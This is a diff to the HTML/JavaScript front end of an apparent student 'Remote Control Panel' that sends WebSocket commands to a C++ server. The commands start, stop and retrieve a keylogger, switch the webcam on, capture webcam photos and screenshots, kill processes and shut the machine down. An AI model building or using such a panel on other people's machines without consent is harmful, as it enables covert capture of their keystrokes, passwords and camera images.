@@ -12,7 +12,7 @@ body {
     margin: 0;
 }
 .container { 
-    max-width: 900px; 
+    max-width: 950px; 
     margin: 0 auto; 
     background: white; 
     padding: 30px; 
@@ -55,18 +55,18 @@ h1 {
 }
 .btn-grid { 
     display: grid; 
-    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); 
-    gap: 12px; 
+    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); 
+    gap: 10px; 
     margin: 20px 0; 
 }
 button { 
-    padding: 15px; 
+    padding: 12px 8px; 
     background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
     color: white; 
     border: none; 
     border-radius: 8px; 
     cursor: pointer; 
-    font-size: 14px; 
+    font-size: 13px; 
     font-weight: bold;
     transition: all 0.3s ease;
     box-shadow: 0 4px 6px rgba(0,0,0,0.1);
@@ -81,48 +81,66 @@ button:active {
 button.danger { 
     background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
 }
-button.danger:hover { 
-    background: linear-gradient(135deg, #f5576c 0%, #f093fb 100%);
+button.success {
+    background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
 }
 button:disabled {
     opacity: 0.5;
     cursor: not-allowed;
     transform: none !important;
 }
+.section {
+    background: #f8f9fa;
+    border-radius: 10px;
+    padding: 15px;
+    margin: 15px 0;
+}
+.section-title {
+    font-weight: bold;
+    color: #333;
+    margin-bottom: 10px;
+    font-size: 14px;
+}
 .input-group { 
-    margin: 20px 0;
     display: flex;
     gap: 10px;
     flex-wrap: wrap;
+    align-items: center;
 }
 input { 
-    padding: 12px; 
+    padding: 10px; 
     border: 2px solid #e0e0e0;
     border-radius: 8px;
     font-size: 14px;
     flex: 1;
-    min-width: 200px;
+    min-width: 150px;
     transition: border-color 0.3s;
 }
 input:focus {
     outline: none;
     border-color: #667eea;
 }
+input[type="number"] {
+    width: 80px;
+    min-width: 80px;
+    flex: 0;
+}
 #output { 
     background: #1e1e1e; 
     color: #00ff00; 
     padding: 20px; 
-    height: 350px; 
+    height: 300px; 
     overflow-y: auto; 
     font-family: 'Courier New', monospace; 
     margin-top: 20px; 
     border-radius: 8px;
-    font-size: 13px;
-    line-height: 1.6;
+    font-size: 12px;
+    line-height: 1.5;
     box-shadow: inset 0 2px 8px rgba(0,0,0,0.3);
 }
 #output p {
     margin: 4px 0;
+    word-wrap: break-word;
 }
 .time {
     color: #888;
@@ -136,11 +154,16 @@ input:focus {
 .info {
     color: #4dabf7 !important;
 }
-#output img {
+#output img, #output video {
     max-width: 100%;
+    max-height: 400px;
     border: 2px solid #00ff00;
     margin: 10px 0;
     border-radius: 4px;
+}
+.media-container {
+    text-align: center;
+    margin: 10px 0;
 }
 .loading {
     display: inline-block;
@@ -154,41 +177,80 @@ input:focus {
 @keyframes spin {
     to { transform: rotate(360deg); }
 }
+.webcam-controls {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    flex-wrap: wrap;
+}
+.webcam-controls label {
+    font-weight: bold;
+    color: #333;
+}
 </style>
 </head>
 <body>
 <div class="container">
 <h1>🖥️ Remote Control Panel</h1>
-<div class="subtitle">WebSocket Architecture (Gateway + C++ Server)</div>
+<div class="subtitle">WebSocket Architecture - Gateway + C++ Server (v2.0 with Webcam)</div>
 
 <div id="status" class="disconnected">
     Status: <span id="statusText">Disconnected</span>
 </div>
 
-<div class="btn-grid">
-<button onclick="sendCmd(1)">📱 List Apps</button>
-<button onclick="sendCmd(4)">⚙️ List Process</button>
-<button onclick="sendCmd(6)">📸 Screenshot</button>
-<button onclick="sendCmd(7)">⌨️ Start Keylogger</button>
-<button onclick="sendCmd(8)">🛑 Stop Keylogger</button>
-<button onclick="sendCmd(9)">📋 Get Keylog</button>
-<button onclick="sendCmd(10)">📹 Webcam On</button>
-<button onclick="sendCmd(11)">📹 Webcam Off</button>
-<button class="danger" onclick="if(confirm('Shutdown remote computer?')) sendCmd(12)">🔴 Shutdown</button>
-<button class="danger" onclick="if(confirm('Restart remote computer?')) sendCmd(13)">🔄 Restart</button>
+<!-- Main Controls -->
+<div class="section">
+    <div class="section-title">📋 Main Controls</div>
+    <div class="btn-grid">
+        <button onclick="sendCmd(1)">📱 List Apps</button>
+        <button onclick="sendCmd(4)">⚙️ List Process</button>
+        <button onclick="sendCmd(6)">📸 Screenshot</button>
+        <button class="danger" onclick="if(confirm('Shutdown?')) sendCmd(12)">🔴 Shutdown</button>
+        <button class="danger" onclick="if(confirm('Restart?')) sendCmd(13)">🔄 Restart</button>
+    </div>
 </div>
 
-<div class="input-group">
-<input type="text" id="appName" placeholder="Application name (e.g., notepad)">
-<button onclick="stopApp()">❌ Stop App</button>
-<button onclick="startApp()">▶️ Start App</button>
+<!-- Application Control -->
+<div class="section">
+    <div class="section-title">📦 Application Control</div>
+    <div class="input-group">
+        <input type="text" id="appName" placeholder="App name (e.g., notepad)">
+        <button onclick="stopApp()">❌ Stop App</button>
+        <button onclick="startApp()">▶️ Start App</button>
+    </div>
 </div>
 
-<div class="input-group">
-<input type="text" id="pid" placeholder="Process ID (e.g., 1234)">
-<button onclick="killProc()">💀 Kill Process</button>
+<!-- Process Control -->
+<div class="section">
+    <div class="section-title">🔧 Process Control</div>
+    <div class="input-group">
+        <input type="text" id="pid" placeholder="Process ID (e.g., 1234)">
+        <button onclick="killProc()">💀 Kill Process</button>
+    </div>
 </div>
 
+<!-- Keylogger -->
+<div class="section">
+    <div class="section-title">⌨️ Keylogger</div>
+    <div class="btn-grid">
+        <button class="success" onclick="sendCmd(7)">▶️ Start Keylogger</button>
+        <button class="danger" onclick="sendCmd(8)">⏹️ Stop Keylogger</button>
+        <button onclick="sendCmd(9)">📋 Get Keylog Data</button>
+    </div>
+</div>
+
+<!-- Webcam Control -->
+<div class="section">
+    <div class="section-title">📹 Webcam Control</div>
+    <div class="webcam-controls">
+        <button class="success" onclick="sendCmd(10)">🟢 Webcam ON</button>
+        <button class="danger" onclick="sendCmd(11)">🔴 Webcam OFF</button>
+        <span style="color: #666;">|</span>
+        <button class="success" onclick="captureWebcam()">📷 Chụp ảnh Webcam</button>
+    </div>
+</div>
+
+<!-- Output -->
 <div id="output">
 <p class="info">🔌 Connecting to WebSocket Gateway...</p>
 </div>
@@ -199,6 +261,24 @@ let ws = null;
 let isConnected = false;
 let reconnectInterval = null;
 
+// Command codes
+const CMD = {
+    LIST_APPS: 1,
+    STOP_APP: 2,
+    START_APP: 3,
+    LIST_PROCESS: 4,
+    KILL_PROCESS: 5,
+    SCREENSHOT: 6,
+    KEYLOG_START: 7,
+    KEYLOG_STOP: 8,
+    KEYLOG_GET: 9,
+    WEBCAM_ON: 10,
+    WEBCAM_OFF: 11,
+    SHUTDOWN: 12,
+    RESTART: 13,
+    WEBCAM_CAPTURE: 14
+};
+
 // Kết nối WebSocket
 function connectWebSocket() {
     try {
@@ -208,12 +288,10 @@ function connectWebSocket() {
             addOutput('✅ Connected to Gateway', 'success');
             updateStatus('connecting', 'Connecting to C++ Server...');
             
-            // Yêu cầu Gateway kết nối đến C++ Server
             ws.send(JSON.stringify({
                 type: 'connect'
             }));
             
-            // Clear reconnect interval nếu có
             if (reconnectInterval) {
                 clearInterval(reconnectInterval);
                 reconnectInterval = null;
@@ -239,7 +317,6 @@ function connectWebSocket() {
             updateStatus('disconnected', 'Disconnected');
             isConnected = false;
             
-            // Tự động reconnect sau 3 giây
             if (!reconnectInterval) {
                 addOutput('🔄 Will reconnect in 3 seconds...', 'info');
                 reconnectInterval = setInterval(() => {
@@ -263,22 +340,37 @@ function handleServerMessage(data) {
         } else {
             updateStatus('disconnected', 'Failed to connect to C++ Server');
             isConnected = false;
-            addOutput('❌ ' + data.message, 'error');
+            if (data.message) {
+                addOutput('❌ ' + data.message, 'error');
+            }
         }
     } else if (data.type === 'response') {
-        if (data.isImage) {
-            // Hiển thị ảnh screenshot
-            const imgData = 'data:image/bmp;base64,' + data.data;
-            addOutput('📸 Screenshot received:', 'success');
-            addImageOutput(imgData);
-        } else {
+        if (data.isImage && data.data) {
+            // Hiển thị ảnh (screenshot hoặc webcam)
+            if (data.command === 14) {
+                addOutput('📷 Webcam photo received:', 'success');
+            } else {
+                addOutput('📸 Screenshot received:', 'success');
+            }
+            addImageOutput('data:image/bmp;base64,' + data.data);
+        } else if (data.isVideo && data.data) {
+            // Hiển thị video
+            addOutput('🎬 Video received:', 'success');
+            addVideoOutput('data:video/avi;base64,' + data.data);
+        } else if (data.data && data.data.trim && data.data.trim() !== '') {
             // Hiển thị text response
-          //  if (data.data && data.data !== 'undefined' && data.data.toString().trim() !== '') {
-                addOutput(data.data, 'info');
-          //  }
+            const lines = data.data.split('\n');
+            lines.forEach(line => {
+                if (line.trim()) {
+                    addOutput(line, 'info');
+                }
+            });
         }
+        // Không làm gì nếu data rỗng hoặc undefined
     } else if (data.type === 'error') {
-        addOutput('❌ ' + data.message, 'error');
+        if (data.message) {
+            addOutput('❌ ' + data.message, 'error');
+        }
     }
 }
 
@@ -307,10 +399,40 @@ function addOutput(text, type = 'info') {
 // Thêm output image
 function addImageOutput(imgSrc) {
     const output = document.getElementById('output');
+    const container = document.createElement('div');
+    container.className = 'media-container';
+    
     const img = document.createElement('img');
     img.src = imgSrc;
     img.alt = 'Screenshot';
-    output.appendChild(img);
+    
+    container.appendChild(img);
+    output.appendChild(container);
+    output.scrollTop = output.scrollHeight;
+}
+
+// Thêm output video
+function addVideoOutput(videoSrc) {
+    const output = document.getElementById('output');
+    const container = document.createElement('div');
+    container.className = 'media-container';
+    
+    const video = document.createElement('video');
+    video.src = videoSrc;
+    video.controls = true;
+    video.autoplay = false;
+    video.style.maxWidth = '100%';
+    
+    // Thêm nút download
+    const downloadBtn = document.createElement('a');
+    downloadBtn.href = videoSrc;
+    downloadBtn.download = 'webcam_capture_' + Date.now() + '.avi';
+    downloadBtn.innerHTML = '💾 Download Video';
+    downloadBtn.style.cssText = 'display: block; margin-top: 10px; color: #00ff00; text-decoration: underline;';
+    
+    container.appendChild(video);
+    container.appendChild(downloadBtn);
+    output.appendChild(container);
     output.scrollTop = output.scrollHeight;
 }
 
@@ -334,7 +456,26 @@ function sendCmd(cmd, data) {
     }
     
     data = data || '';
-    addOutput('📤 Sending command ' + cmd + '...', 'info');
+    
+    // Hiển thị thông báo phù hợp với từng command
+    const cmdNames = {
+        1: 'List Apps',
+        2: 'Stop App',
+        3: 'Start App',
+        4: 'List Processes',
+        5: 'Kill Process',
+        6: 'Screenshot',
+        7: 'Start Keylogger',
+        8: 'Stop Keylogger',
+        9: 'Get Keylog Data',
+        10: 'Webcam ON',
+        11: 'Webcam OFF',
+        12: 'Shutdown',
+        13: 'Restart',
+        14: 'Webcam Capture'
+    };
+    
+    addOutput('📤 Sending: ' + (cmdNames[cmd] || 'Command ' + cmd) + (data ? ' (' + data + ')' : ''), 'info');
     
     ws.send(JSON.stringify({
         type: 'command',
@@ -345,9 +486,9 @@ function sendCmd(cmd, data) {
 
 // Stop app
 function stopApp() {
-    const name = document.getElementById('appName').value;
+    const name = document.getElementById('appName').value.trim();
     if (name) {
-        sendCmd(2, name);
+        sendCmd(CMD.STOP_APP, name);
     } else {
         addOutput('⚠️ Please enter application name', 'error');
     }
@@ -355,9 +496,9 @@ function stopApp() {
 
 // Start app
 function startApp() {
-    const name = document.getElementById('appName').value;
+    const name = document.getElementById('appName').value.trim();
     if (name) {
-        sendCmd(3, name);
+        sendCmd(CMD.START_APP, name);
     } else {
         addOutput('⚠️ Please enter application path', 'error');
     }
@@ -365,12 +506,18 @@ function startApp() {
 
 // Kill process
 function killProc() {
-    const pid = document.getElementById('pid').value;
+    const pid = document.getElementById('pid').value.trim();
     if (pid) {
-        sendCmd(5, pid);
+        sendCmd(CMD.KILL_PROCESS, pid);
     } else {
         addOutput('⚠️ Please enter process ID', 'error');
     }
+}
+
+// Capture webcam
+function captureWebcam() {
+    addOutput('📷 Capturing webcam photo... Please wait.', 'info');
+    sendCmd(CMD.WEBCAM_CAPTURE, '1');  // Chụp 1 ảnh
 }
 
 // Kiểm tra trạng thái định kỳ
